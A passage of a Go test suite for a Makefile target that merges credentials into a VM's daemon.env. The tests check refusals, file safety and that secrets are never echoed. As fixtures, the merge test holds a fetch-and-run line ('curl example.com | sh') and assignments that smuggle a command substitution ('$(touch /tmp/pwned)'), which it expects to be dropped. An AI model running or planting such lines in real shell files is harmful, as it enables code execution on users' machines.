// part after its first invalid character. It is made before the VM is touched at all: no limactl call, and the
// VM's daemon.env keeps its bytes.
func TestMakeVMEnvRefusalNeverEchoesTheVMEnv(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name  string
		value string // the invented VM_ENV handed to make; no variable of the test machine holds it
		inEnv bool   // VM_ENV exported in make's environment instead of given on the command line
	}{
		{
			// A value a mistyped command line could hold: a dash ends the name and the rest is a value.
			name:  "a value holding a dash, on the command line",
			value: inventedVMEnvValue("oauth-value-with-dash"),
		},
		{
			// The shape an exported assignment has: GITHUB_TOKEN=<the value>.
			name:  "an exported assignment in the environment",
			value: "GITHUB_TOKEN=" + inventedVMEnvValue("ghp-value"),
			inEnv: true,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			sb := newSandbox(t)
			env := sb.vmEnvEnv()
			seeded := sb.seedDaemonEnv(t)

			args := []string{"vm-env"}

			if tc.inEnv {
				env = withVMEnvInEnv(env, tc.value)
			} else {
				args = append(args, "VM_ENV="+tc.value)
			}

			stdout, stderr, err := runMake(t, args, env)
			text := stdout + stderr

			if err == nil {
				t.Fatalf("make vm-env exited 0 with a VM_ENV the shell would not read as one word: it must refuse it (issue #234)\nstdout: %s\nstderr: %s", stdout, stderr)
			}

			if !strings.Contains(text, "VM_ENV") {
				t.Errorf("the refusal does not name VM_ENV, so a maintainer cannot tell that the VM_ENV they passed is what vm-env refused (issue #234):\nstdout: %s\nstderr: %s", stdout, stderr)
			}

			// Neither the value nor its tail is echoed. The failure names what was echoed, never the text: the
			// very thing that must not reach the output must not reach a test report either (CLAUDE.md rule 3).
			for _, echo := range []struct {
				kind  string
				value string
			}{
				{kind: "the VM_ENV it was given", value: tc.value},
				{kind: "the part of VM_ENV after its first invalid character", value: vmEnvInvalidTail(tc.value)},
			} {
				if echo.value != "" && strings.Contains(text, echo.value) {
					t.Errorf("the refusal echoes %s: a VM_ENV a shell refused can hold a credential a maintainer pasted by mistake, so echoing it writes that value into a scrollback, a log or a screenshot. The refusal must name VM_ENV and never its content (issue #234 audit L1):\nstdout: %s\nstderr: %s",
						echo.kind, stdout, stderr)
				}
			}

			// A refusal before the VM is touched at all: nothing handed limactl writes daemon.env, because
			// nothing is handed limactl.
			sb.assertNoLimaCalls(t, "a VM_ENV the shell cannot read as one word is refused")

			got, readErr := os.ReadFile(sb.daemonEnvPath())
			if readErr != nil {
				t.Fatalf("read the VM's daemon.env after a refused make vm-env: %v", readErr)
			}

			if diff := cmp.Diff(string(seeded), string(got)); diff != "" {
				t.Errorf("make vm-env rewrote the VM's daemon.env although it refused a VM_ENV the shell would not read as one word: the file must be byte for byte what it was (issue #234) (-want +got):\n%s", diff)
			}

			assertNoCredentialValues(t, "make vm-env's refusal", text)
		})
	}
}

// TestMakeVMEnvRefusesAnUnreadableDaemonEnv pins the final-round audit finding on issue #234 (L2): a merge
// reads the VM's daemon.env to decide which lines it keeps. When that read fails - the file's mode names no
// read bit for the VM's user - vm-env must refuse, deliberately and in its own words, rather than treat
// "cannot read" as "nothing to keep" and replace the file, which would silently drop every line the merge
// could not read. The refusal names the file a maintainer has to fix and leaves it byte for byte as it was, so
// the maintainer can chmod it and run the merge again.
func TestMakeVMEnvRefusesAnUnreadableDaemonEnv(t *testing.T) {
	t.Parallel()

	if os.Geteuid() == 0 {
		t.Skip("root reads a mode 000 file, so it cannot stand in for a daemon.env its VM's user cannot read")
	}

	sb := newSandbox(t)
	env := sb.vmEnvEnv()
	delete(env, "CLAUDE_CODE_OAUTH_TOKEN")
	delete(env, "DEEPSEEK_API_KEY")

	seeded := sb.seedDaemonEnv(t)
	path := sb.daemonEnvPath()

	if err := os.Chmod(path, 0o000); err != nil {
		t.Fatalf("make the VM's daemon.env unreadable: %v", err)
	}

	stdout, stderr, err := runMake(t, []string{"vm-env", "VM_ENV=GITHUB_TOKEN"}, env)
	text := stdout + stderr

	if err == nil {
		t.Fatalf("make vm-env VM_ENV=GITHUB_TOKEN exited 0 although the VM's daemon.env could not be read: a merge must refuse, so no line it could not read is silently replaced (issue #234 audit L2)\nstdout: %s\nstderr: %s", stdout, stderr)
	}

	// The refusal is vm-env's own, and names the file the maintainer has to fix: today's run dies with the
	// VM-side shell's arithmetic error, which says nothing about daemon.env and is no refusal at all.
	var said []string

	for _, line := range strings.Split(text, "\n") {
		if strings.HasPrefix(strings.TrimSpace(line), "vm-env:") {
			said = append(said, line)
		}
	}

	if !strings.Contains(strings.Join(said, "\n"), "daemon.env") {
		t.Errorf("make vm-env's output holds no vm-env line naming daemon.env, so the run failed without refusing: a maintainer whose daemon.env the VM's user cannot read needs vm-env to say which file it could not read and that nothing was written, not a shell's error about an arithmetic expression (issue #234 audit L2):\nstdout: %s\nstderr: %s", stdout, stderr)
	}

	// The mode back, so the bytes can be compared at all: the test reads the file it just made unreadable.
	if chmodErr := os.Chmod(path, 0o600); chmodErr != nil {
		t.Fatalf("restore the mode of the VM's daemon.env so the test can read it back: %v", chmodErr)
	}

	got, readErr := os.ReadFile(path)
	if readErr != nil {
		t.Fatalf("read the VM's daemon.env after a refused make vm-env: %v", readErr)
	}

	if diff := cmp.Diff(string(seeded), string(got)); diff != "" {
		t.Errorf("make vm-env rewrote the VM's daemon.env whose lines it could not read, silently dropping them: an unreadable file must be refused and left byte for byte as it was (issue #234 audit L2) (-want +got):\n%s", diff)
	}

	assertNoCredentialValues(t, "make vm-env's output", stdout+stderr)
}

// TestMakeVMEnvSweepsOnlyOldLeftovers pins the final-round review finding and audit finding on issue #234
// (review 2, audit L3): the temporary files a killed vm-env leaves beside daemon.env are swept, but only the
// ones older than a minute. A temporary file written right now is a concurrent vm-env's: removing it makes
// that run's final move fail or, worse, move a file the other run still writes, so the sweep leaves a fresh
// one alone. A name the sweep does not match is never its business.
func TestMakeVMEnvSweepsOnlyOldLeftovers(t *testing.T) {
	t.Parallel()

	sb := newSandbox(t)
	env := sb.vmEnvEnv()
	dir := sb.vmPath(".config/dot-agent-deck")

	// The leftovers as mktemp names them: one from a run killed ten minutes ago, one a run that is writing it
	// right now, and one name the sweep's pattern does not match.
	stale := filepath.Join(dir, ".daemon.env.abc123")
	concurrent := filepath.Join(dir, ".daemon.env.def456")
	unmatched := filepath.Join(dir, ".daemon.env.bak")

	for _, path := range []string{stale, concurrent, unmatched} {
		writeFileMode(t, path, []byte("LEFT_OVER=\n"), 0o600)
	}

	tenMinutesAgo := time.Now().Add(-10 * time.Minute)

	for _, path := range []string{stale, unmatched} {
		if err := os.Chtimes(path, tenMinutesAgo, tenMinutesAgo); err != nil {
			t.Fatalf("age the leftover %s: %v", filepath.Base(path), err)
		}
	}

	stdout, stderr, err := runMake(t, []string{"vm-env"}, env)
	if err != nil {
		t.Fatalf("make vm-env with every credential set: %v\nstdout: %s\nstderr: %s", err, stdout, stderr)
	}

	if _, statErr := os.Stat(stale); !errors.Is(statErr, fs.ErrNotExist) {
		t.Errorf("make vm-env left %s, the temporary file of a run killed ten minutes ago: the sweep must remove a leftover older than a minute, or every interrupted run leaves a file next to daemon.env for good (issue #234) (stat error: %v)",
			filepath.Base(stale), statErr)
	}

	if _, statErr := os.Stat(concurrent); statErr != nil {
		t.Errorf("make vm-env removed %s, the temporary file of a vm-env that is still running: the sweep must leave a fresh temporary file alone, so a concurrent run's file is not removed under it (issue #234 review 2, audit L3): %v",
			filepath.Base(concurrent), statErr)
	}

	if _, statErr := os.Stat(unmatched); statErr != nil {
		t.Errorf("make vm-env removed %s, whose name the sweep's pattern does not match: the sweep removes only the temporary files mktemp writes beside daemon.env, never another file of that directory (issue #234): %v",
			filepath.Base(unmatched), statErr)
	}

	body, readErr := os.ReadFile(sb.daemonEnvPath())
	if readErr != nil {
		t.Fatalf("read the VM's daemon.env: %v", readErr)
	}

	want := []string{
		"CLAUDE_CODE_OAUTH_TOKEN=" + fakeEnvValue("CLAUDE_CODE_OAUTH_TOKEN"),
		"DEEPSEEK_API_KEY=" + fakeEnvValue("DEEPSEEK_API_KEY"),
		"GITHUB_TOKEN=" + fakeEnvValue("GITHUB_TOKEN"),
	}

	if diff := cmp.Diff(sortedEnvLines(strings.Join(want, "\n")), sortedEnvLines(string(body))); diff != "" {
		t.Errorf("make vm-env wrote the wrong lines to the VM's daemon.env (-want +got):\n%s", diff)
	}

	assertNoCredentialValues(t, "make vm-env's output", stdout+stderr)
}

// TestMakeVMEnvRefusesAGlobAsAName pins the reviewer's finding on issue #234: `make vm-env VM_ENV=*` names no
// variable, and make must refuse it. The star is not a variable name, and the shell must never expand it in the
// working directory first: the refusal would then list the names of the files there, none of which the
// maintainer asked for. The refusal itself names VM_ENV and shows none of its value, the star included: `*`
// may stand where a credential was meant, and a value must never reach a pane (issue #234 audit L1).
func TestMakeVMEnvRefusesAGlobAsAName(t *testing.T) {
	t.Parallel()

	sb := newSandbox(t)
	env := sb.vmEnvEnv()
	seeded := sb.seedDaemonEnv(t)

	stdout, stderr, err := runMake(t, []string{"vm-env", "VM_ENV=*"}, env)
	text := stdout + stderr

	if err == nil {
		t.Fatalf("make vm-env VM_ENV=* exited 0: a star is not a variable name, so it must be refused (issue #234)\nstdout: %s\nstderr: %s", stdout, stderr)
	}

	// vm-env's own lines, not make's diagnostics: make closes a failed recipe with the Makefile's own path.
	var said []string

	for _, line := range strings.Split(text, "\n") {
		if strings.HasPrefix(strings.TrimSpace(line), "vm-env:") {
			said = append(said, line)
		}
	}

	// vm-env's own lines, without make's `***`, which is why the star is looked for here and not in all of text.
	saidText := strings.Join(said, "\n")

	if !strings.Contains(saidText, "VM_ENV") {
		t.Errorf("the refusal does not name VM_ENV, so a maintainer cannot tell that the VM_ENV they passed is what vm-env refused (issue #234):\nstdout: %s\nstderr: %s", stdout, stderr)
	}

	if !strings.Contains(strings.ToLower(saidText), "not shown") {
		t.Errorf("the refusal does not say that VM_ENV's value is not shown, so a maintainer cannot tell whether the star they handed vm-env was echoed (issue #234 audit L1):\nstdout: %s\nstderr: %s", stdout, stderr)
	}

	if strings.Contains(saidText, "*") {
		t.Errorf("the refusal shows the star it was given: the character-class refusal must show none of VM_ENV's value, because a maintainer may have pasted a credential where the star stands (issue #234 audit L1):\nstdout: %s\nstderr: %s", stdout, stderr)
	}

	// A file of the working directory standing in for the name: the star was globbed, not refused.
	root, absErr := filepath.Abs(moduleRoot)
	if absErr != nil {
		t.Fatalf("resolve the repository root: %v", absErr)
	}

	entries, readDirErr := os.ReadDir(root)
	if readDirErr != nil {
		t.Fatalf("read %s: %v", root, readDirErr)
	}

	for _, entry := range entries {
		// The shell's `*` never matches a name that starts with a dot.
		if strings.HasPrefix(entry.Name(), ".") {
			continue
		}

		if strings.Contains(saidText, entry.Name()) {
			t.Errorf("the refusal names %q, an entry of the working directory: VM_ENV's `*` was expanded by the shell instead of being refused as the name it is (issue #234):\nstdout: %s\nstderr: %s",
				entry.Name(), stdout, stderr)
		}
	}

	sb.assertNoLimaCalls(t, "a star is not a variable name")

	got, readErr := os.ReadFile(sb.daemonEnvPath())
	if readErr != nil {
		t.Fatalf("read the VM's daemon.env after a refused make vm-env: %v", readErr)
	}

	if diff := cmp.Diff(string(seeded), string(got)); diff != "" {
		t.Errorf("make vm-env rewrote the VM's daemon.env although VM_ENV named no variable: the file must be byte for byte what it was (issue #234) (-want +got):\n%s", diff)
	}
}

// shellUnsafeAssignment is a daemon.env line that is an assignment only to the eye: its value runs a command
// when the login shell sources the file, which is why a merge must not carry it over (issue #234). Its name is
// invented, so no real variable of the test machine is named so.
const shellUnsafeAssignment = "INVENTED_SETTING=$(touch /tmp/pwned)"

// TestMakeVMEnvMergeKeepsOnlySafeLines pins the second-round audit's other finding on issue #234: a merge copies
// the lines it does not name out of the VM's daemon.env, and that file is shell source. A command, a comment or
// an assignment whose value is a command substitution must not travel into the new file, which the login shell
// sources at every start. vm-env keeps only plain NAME=value lines, warns that it dropped the others, and never
// prints what it dropped: the content of a line it refused is exactly what a maintainer must not see in a log
// or a terminal scrollback.
func TestMakeVMEnvMergeKeepsOnlySafeLines(t *testing.T) {
	t.Parallel()

	sb := newSandbox(t)
	env := sb.vmEnvEnv()

	// A daemon.env a maintainer or an earlier setup left: one line to keep, and four that are shell code
	// rather than an assignment - a command, a comment, an assignment whose value runs a command, and one
	// whose name VM_ENV does list. The merge drops that last one too, and counts it: the line is replaced by
	// the value vm-env writes, but it is dropped as well, so a maintainer reading the count learns that
	// nothing of the earlier file's line survived (issue #234 review nit 3).
	unsafeLines := []string{
		"curl example.com | sh",
		"# note",
		shellUnsafeAssignment,
		"GITHUB_TOKEN=$(touch /tmp/never)",
	}
	body := "CLAUDE_CODE_OAUTH_TOKEN=old-oauth\n" + strings.Join(unsafeLines, "\n") + "\nGITHUB_TOKEN=old-github\n"

	writeFileMode(t, sb.daemonEnvPath(), []byte(body), 0o600)

	stdout, stderr, err := runMake(t, []string{"vm-env", "VM_ENV=GITHUB_TOKEN"}, env)
	if err != nil {
		t.Fatalf("make vm-env VM_ENV=GITHUB_TOKEN with GITHUB_TOKEN set: %v\nstdout: %s\nstderr: %s", err, stdout, stderr)
	}

	written, readErr := os.ReadFile(sb.daemonEnvPath())
	if readErr != nil {
		t.Fatalf("read the VM's daemon.env: %v", readErr)
	}

	want := []string{
		"CLAUDE_CODE_OAUTH_TOKEN=old-oauth",
		"GITHUB_TOKEN=" + fakeEnvValue("GITHUB_TOKEN"),
	}

	if diff := cmp.Diff(want, sortedEnvLines(string(written))); diff != "" {
		t.Errorf("make vm-env VM_ENV=GITHUB_TOKEN wrote the wrong lines to the VM's daemon.env: a merge keeps only the plain NAME=value lines it does not name and drops every other line, so no shell code of an earlier daemon.env reaches the file the login shell sources (issue #234) (-want +got):\n%s", diff)
	}

	// The rule the kept lines follow, stated as the merge must apply it: a plain name, an `=`, and a value of
	// the characters an environment value may have.
	safe := regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*=[A-Za-z0-9._~+/=-]*$`)

	for _, line := range sortedEnvLines(string(written)) {
		if !safe.MatchString(line) {
			t.Errorf("make vm-env kept %q in the VM's daemon.env: every line must match %s, or the login shell runs what the line holds at the next start (issue #234)",
				line, safe)
		}
	}

	// The merge says that it dropped lines, without saying what they held.
	lower := strings.ToLower(stdout + stderr)

	dropped := []string{"drop", "skip", "ignor"}
	if !slices.ContainsFunc(dropped, func(word string) bool { return strings.Contains(lower, word) }) {
		t.Errorf("make vm-env VM_ENV=GITHUB_TOKEN dropped %d line(s) of the earlier daemon.env without saying so: a merge that silently discards a setting leaves the maintainer with no way to learn that daemon.env lost it, and no clue which (issue #234)\nstdout: %s\nstderr: %s",
			len(unsafeLines), stdout, stderr)
	}

	// The warning's count is exact, not "some lines": a maintainer reads it to know how much of daemon.env the
	// merge left behind, and a line VM_ENV names is dropped like every other unsafe line (issue #234 review
	// nit 3).
	droppedWarning := regexp.MustCompile(`(?i)dropped\s+(\d+)\s+line`)

	if match := droppedWarning.FindStringSubmatch(stdout + stderr); match == nil {
		t.Errorf("make vm-env's warning does not say how many lines it dropped, so the maintainer cannot tell whether a line of daemon.env was lost (issue #234):\nstdout: %s\nstderr: %s", stdout, stderr)
	} else if match[1] != strconv.Itoa(len(unsafeLines)) {
		t.Errorf("make vm-env's warning says it dropped %s line(s), want %d: the count is every line of the earlier daemon.env that is not a plain NAME=value line, including one whose name VM_ENV lists (issue #234 review nit 3):\nstdout: %s\nstderr: %s",
			match[1], len(unsafeLines), stdout, stderr)
	}

	for _, line := range unsafeLines {
		if strings.Contains(stdout+stderr, line) {
			t.Errorf("make vm-env's output prints the line it dropped from daemon.env: the output must name what it kept and say that it dropped lines, never reproduce the content of a line it refused, which may hold a command or a secret (issue #234)\nstdout: %s\nstderr: %s",
				stdout, stderr)
		}
	}

	assertNoSecrets(t, "make vm-env VM_ENV=GITHUB_TOKEN's output", stdout+stderr, []secret{
		{kind: "earlier value of CLAUDE_CODE_OAUTH_TOKEN", value: "old-oauth"},
		{kind: "earlier value of GITHUB_TOKEN", value: "old-github"},
	})

	assertNoCredentialValues(t, "make vm-env's output", stdout+stderr)
}
